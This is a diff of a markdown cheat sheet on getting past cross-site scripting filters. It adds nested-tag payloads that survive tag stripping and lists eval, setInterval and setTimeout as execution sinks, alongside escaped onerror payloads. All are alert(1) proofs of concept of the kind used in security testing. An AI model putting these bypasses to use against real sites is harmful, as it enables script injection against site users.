@@ -190,8 +190,9 @@ https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot
   
 #### Removing HTML Tags
   
-`<scr<iframe>ipt>alert(1)</script>`
-  
+`<scr<iframe>ipt>alert(1)</script>`  
+`<sCR<script>iPt>alert(1)</SCr</script>IPt>`
+
 ### Scaping Quote
   
 ### Methods
@@ -206,10 +207,12 @@ Examples:
 `decodeURI(/alert(%22xss%22)/.source)`  
 `decodeURIComponent(/alert(%22xss%22)/.source)`
   
-Add execution sink for execution:
+Add execution sink:
   
--> eval
-  
+-> eval  
+-> setInterval  
+-> setTimeout  
+
 ### Escaping Parentheses
   
 `<img src=x onerror="\u0061lert(1)"/>`  
